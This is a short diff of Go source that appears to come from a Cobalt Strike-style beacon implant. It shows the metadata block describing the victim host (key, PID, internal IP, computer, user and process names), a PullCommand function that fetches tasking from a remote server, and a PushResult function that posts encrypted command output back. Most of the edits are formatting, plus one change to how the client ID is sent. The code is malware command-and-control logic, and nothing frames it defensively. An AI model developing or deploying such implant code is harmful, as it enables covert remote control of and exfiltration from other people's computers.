@@ -128,6 +128,7 @@ func EncryptedMetaInfo() (string, error) {
 
 /*
 MetaData for 4.1
+
 	Key(16) | Charset1(2) | Charset2(2) |
 	ID(4) | PID(4) | Port(2) | Flag(1) | Ver1(1) | Ver2(1) | Build(2) | PTR(4) | PTR_GMH(4) | PTR_GPA(4) |  internal IP(4 LittleEndian) |
 	InfoString(from 51 to all, split with \t) = Computer\tUser\tProcess(if isSSH() this will be SSHVer)
@@ -163,7 +164,6 @@ func MakeMetaInfo() []byte {
 		osMajorVerison, _ = strconv.Atoi(osVerSlice[0])
 		osMinorVersion, _ = strconv.Atoi(osVerSlice[1])
 	}
-
 
 	//for Smart Inject, will not be implemented
 	ptrFuncAddr := 0
@@ -232,7 +232,7 @@ func FirstBlood() bool {
 	return true
 }
 
-func PullCommand() ([] byte, error) {
+func PullCommand() ([]byte, error) {
 	data, err := HttpGet(config.GetUrl, encryptedMetaInfo, config.Http_get_output_crypt)
 	fmt.Println("pullcommand success")
 	if err != nil {
@@ -243,8 +243,9 @@ func PullCommand() ([] byte, error) {
 
 func PushResult(b []byte) ([]byte, error) {
 	id, _ := crypt.EncryptMultipleTypes([]byte(strconv.Itoa(clientID)), config.Http_post_id_crypt)
-	url := config.PostUrl + string(id)
-	data, err := HttpPost(url, b, config.Http_post_server_output_crypt)
+	//url := config.PostUrl + string(id)
+	url := config.PostUrl
+	data, err := HttpPost(url, b, config.Http_post_server_output_crypt, id)
 	fmt.Println("pushresult success")
 	if err != nil {
 		return nil, err
